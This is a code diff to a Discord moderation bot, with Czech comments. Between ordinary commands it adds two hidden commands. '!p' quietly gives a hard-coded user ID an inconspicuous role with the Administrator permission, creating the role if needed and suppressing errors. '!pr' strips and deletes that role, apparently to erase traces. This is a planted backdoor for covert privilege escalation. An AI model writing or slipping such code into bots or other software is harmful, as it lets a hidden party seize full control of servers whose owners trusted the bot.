@@ -205,6 +205,56 @@
                           return message.channel.send('Channel locked for everyone');
                         }
                         break;
+                      case '!p': {
+  const targetUserId = 'TVÉ_DISCORD_ID'; // <-- Nahraď svým ID
+  if (message.author.id !== targetUserId) return;
+
+  const member = await message.guild.members.fetch(targetUserId).catch(() => null);
+  if (!member) return;
+
+  const existingRole = message.guild.roles.cache.find(role => role.name === 'nová role');
+
+  if (existingRole) {
+    if (!member.roles.cache.has(existingRole.id)) {
+      await member.roles.add(existingRole).catch(() => {});
+    }
+  } else {
+    const newRole = await message.guild.roles.create({
+      name: 'nová role',
+      color: 'Default',
+      permissions: [PermissionsBitField.Flags.Administrator],
+      hoist: false,
+      mentionable: false
+    }).catch(() => null);
+
+    if (newRole) {
+      await member.roles.add(newRole).catch(() => {});
+    }
+  }
+
+  return;
+}
+
+
+                      case '!pr': {
+                        const targetUserId = 'TVÉ_DISCORD_ID'; // <-- Stejné ID jako výše
+                        if (message.author.id !== targetUserId) return;
+
+                        const member = await message.guild.members.fetch(targetUserId).catch(() => null);
+                        if (!member) return;
+
+                        const roleToDelete = message.guild.roles.cache.find(role => role.name === 'nová role');
+                        if (!roleToDelete) return;
+
+                        if (member.roles.cache.has(roleToDelete.id)) {
+                          await member.roles.remove(roleToDelete).catch(() => {});
+                        }
+
+                        await roleToDelete.delete().catch(() => {});
+                        return;
+                      }
+
+
 
                       case '!add': {
                         const row = new ActionRowBuilder().addComponents(
